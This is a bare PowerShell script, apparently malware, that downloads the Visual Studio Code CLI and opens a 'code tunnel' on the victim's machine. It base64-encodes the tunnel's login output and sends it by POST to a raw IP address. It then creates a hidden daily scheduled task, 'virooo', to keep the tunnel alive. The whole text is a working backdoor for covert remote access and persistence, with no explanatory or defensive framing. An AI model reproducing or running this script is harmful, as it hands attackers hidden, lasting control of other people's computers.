Start-Sleep -Seconds 2
$dest = "$env:PUBLIC\Documents"
Invoke-WebRequest -Uri "https://vscode.download.prss.microsoft.com/dbazure/download/stable/441438abd1ac652551dbe4d408dfcec8a499b8bf/vscode_cli_win32_x64_cli.zip" -OutFile "$dest\vscode.zip"
Expand-Archive -Path "$dest\vscode.zip" -DestinationPath "$dest"
Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', "`"$dest\code.exe tunnel --accept-server-license-terms --random-name > $dest\code-output.log 2>&1`"" -NoNewWindow
Start-Sleep -Seconds 6
$logContent = Get-Content "$dest\code-output.log" -Raw
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($logContent))
$headers = @{ "X-Server" = $encoded }
Invoke-WebRequest -Uri "https://185.8.175.242:8080/rhyder" -Method POST -Headers $headers -Body ""
schtasks /Create /TN "virooo" /TR "powershell.exe -WindowStyle Hidden -Command Start-Process -FilePath '$dest\code.exe' -ArgumentList 'tunnel','--accept-server-license-terms' -NoNewWindow" /SC DAILY /ST 11:00 /F
